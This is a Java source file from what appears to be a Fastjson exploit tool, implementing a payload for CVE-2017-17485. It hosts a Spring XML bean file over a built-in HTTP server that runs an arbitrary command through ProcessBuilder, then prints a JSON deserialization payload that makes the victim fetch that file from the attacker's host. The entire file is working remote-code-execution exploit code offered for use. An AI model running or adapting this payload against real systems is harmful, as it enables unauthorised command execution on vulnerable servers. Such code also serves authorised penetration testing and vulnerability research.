package payloads;

import payloads.annotation.Dependencies;
import payloads.annotation.PayloadType;
import payloads.annotation.VulVersion;
import server.CodebaseServer;
import util.*;

import java.io.IOException;

@PayloadType({PayloadType.HTTP})
@VulVersion({"CVE-2017-17485"})
public class FileSystemXmlApplicationContext1 implements ObjectPayload{
    @Override
    public void process(String[] args) throws IOException {
        if(args.length < 3){
            System.out.println(String.format("[*] Usage: java -jar FastjsonExploit-[version].jar FileSystemXmlApplicationContext1 [hostname] [cmd]"));
            return;
        }

        String host = args[1].trim();
        int http_port = Util.getUnusePort("localhost");
        String cmd = args[2].trim();

        //lunch a http server to serve spel file
        String spel = "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
                "  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                "  xsi:schemaLocation=\"\n" +
                "     http://www.springframework.org/schema/beans\n" +
                "     http://www.springframework.org/schema/beans/spring-beans.xsd\n" +
                "\">\n" +
                "  <bean id=\"pb\" class=\"java.lang.ProcessBuilder\">\n" +
                "     <constructor-arg value=\"##CMD##\" />\n" +
                "     <property name=\"whatever\" value=\"#{ pb.start() }\"/>\n" +
                "  </bean>\n" +
                "</beans>";
        Common.byteCode = spel.replace("##CMD##", cmd).getBytes();

        CodebaseServer.lanuchCodebaseURLServer("0.0.0.0", http_port);

        JarFileReader jarFileReader = new JarFileReader();
        String payload = jarFileReader.read("FileSystemXmlApplicationContext.json");
        payload = payload.replace("##SPEL##",String.format("http://%s:%d/Exploit.class",host, http_port));
        System.out.println("[*] payload build success!");
        System.out.println("\n" + payload + "\n");
    }
}
